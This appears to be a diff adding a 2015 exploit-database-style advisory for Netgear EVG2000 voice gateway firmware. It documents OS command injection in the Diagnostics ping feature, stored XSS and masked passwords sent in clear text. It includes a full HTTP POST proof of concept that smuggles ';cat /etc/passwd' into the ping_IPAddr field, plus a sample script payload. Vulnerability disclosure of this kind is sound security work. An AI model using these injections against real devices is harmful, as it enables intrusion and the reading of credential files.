@@ -1,0 +1,82 @@
+# Exploit Title: [Netgear Voice Gateway Multiple Vulnerabilities]
+# Date: May 01, 2015 [No response from Vendor]
+# Discovered by: Karn Ganeshen
+# Vendor Homepage: [www.netgear.com]
+# Version: [Firmware Version: V2.3.0.23_2.3.23]
+
+
+*Netgear Voice Gateway Multiple Vulnerabilities *
+
+*Device Info *
+Device Type: Netgear Voice Gateway EVG2000
+Account Name: EVG2000
+Firmware Version: V2.3.0.23_2.3.23
+
+*1. Web application vulnerabilities OS Command Injection *
+
+Netgear Voice Gateway EVG2000 is managed through a web management portal.
+The application provides a Diagnostics feature that has four (4) options:
+
+a.Ping an IP address
+b.Perform a DNS Lookup
+c.Display the Routing Table
+d.Reboot the Router
+
+Option 1 Ping an IP address was confirmed to be vulnerable to OS Command
+Injection.
+
+The ping_IPAddr parameter does not sufficiently validate input. It is
+possible to use the semi-colon character (;) to inject arbitrary OS
+commands and retrieve the output in the application's responses.
+
+*PoC*
+
+*HTTP POST Request*
+
+POST /ping.cgi HTTP/1.1
+Host: 1.3.3.7
+User-Agent: blah
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US
+Referer: http://1.3.3.7/DIAG_diag.htm
+Authorization: Basic <b64_value_here>
+Content-Length: 69
+
+IPAddr1=1&IPAddr2=3&IPAddr3=3&IPAddr4=7&ping=Ping&ping_IPAddr=1.3.3.7;cat
+/etc/passwd
+
+*HTTP Response*
+.....
+<html-output>
+root:<redacted_hash>:0:0:Linux User,,,:/root/:/bin/sh
+nobody:*:0:0nobody:/:/bin/sh
+admin:<clear-text-admin-pass>:0:0:admin:/:/bin/sh
+
+
+*2. Web application vulnerabilities Stored Cross-Site Scripting (XSS) *
+
+In the Services menu, the Service Table lists any existing Service-Port
+mappings. A new service can be added with a payload value of
+*<script>alert(xss)</script>* in the ServiceType parameter.
+
+The application does not check any malicious input and accepted this new
+entry. The JavaScript input was then returned unmodified in a subsequent
+request for the Services Table Entries.
+
+The web application lacks strict input validation and hence is vulnerable
+to Stored Cross-Site Scripting attack.
+
+
+*3. Application does not secure configured passwords (HTTP) *
+
+Any & all configured sensitive information such as passwords & keys are not
+secured properly. These are masked and only ***** is shown in the
+corresponding fields.
+
+This client-side restriction can easily be bypassed though. It is possible
+to capture masked values via ‘Inspect Element’ and / or via an intercepting
+proxy.
+
+The application should mask/censure (*****) the passwords, keys and any
+other crucial pieces of configuration and must not pass the values in
+clear-text.
